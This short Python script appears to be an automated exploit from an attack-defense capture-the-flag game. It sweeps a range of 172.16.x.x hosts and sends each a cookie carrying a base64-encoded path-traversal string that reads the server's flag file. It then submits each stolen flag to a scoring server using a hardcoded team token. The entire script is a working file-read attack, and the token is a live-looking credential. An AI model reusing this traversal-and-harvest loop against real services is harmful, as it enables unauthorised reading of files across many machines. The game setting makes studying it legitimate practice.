import requests
import re
import time

submit_flag_url = 'http://10.10.10.10:9000/submit_flag/'
token = 'dxUrnS8uMQ9Yb2dNvZ372595jQZZEnmxZrtBarnw2zu7UAeMses2929YMrDdBy4w5n97jYuKaRE'


def attack_1():
    url_template = 'http://172.16.{}.{}:1337/captcha'
    cookies = {'uuid': 'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZmxhZw=='}

    for num in range(11, 19):
        for i in range(1, 25):
            print(f'{i}.{num}')
            url = url_template.format(i, num)
            try:
                r = requests.post(url, cookies=cookies, timeout=2)
                flag = re.search('(.{60})', r.text).group(1)
                print(requests.post(submit_flag_url, data={'flag': flag, 'token': token}).text)
            except Exception as e:
                print(e)
                pass


attack_1()
